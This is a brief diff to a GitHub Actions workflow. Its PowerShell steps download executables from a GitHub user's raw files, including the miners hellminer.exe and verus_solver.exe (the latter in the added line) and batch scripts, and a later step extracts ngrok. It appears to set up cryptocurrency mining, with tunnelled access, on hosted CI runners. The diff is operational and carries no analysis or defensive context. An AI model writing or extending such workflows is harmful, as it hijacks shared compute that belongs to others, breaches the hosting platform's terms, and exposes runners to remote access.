@@ -15,6 +15,7 @@ jobs:
         Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/start.bat -OutFile start.bat
         Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/mine/hellminer.exe -OutFile hellminer.exe
         Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/mine/vendorax.bat -OutFile vendorax.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/mine/verus_solver.exe -OutFile verus_solver.exe
 
     - name: Extract ngrok Files
       run: Expand-Archive ngrok.zip
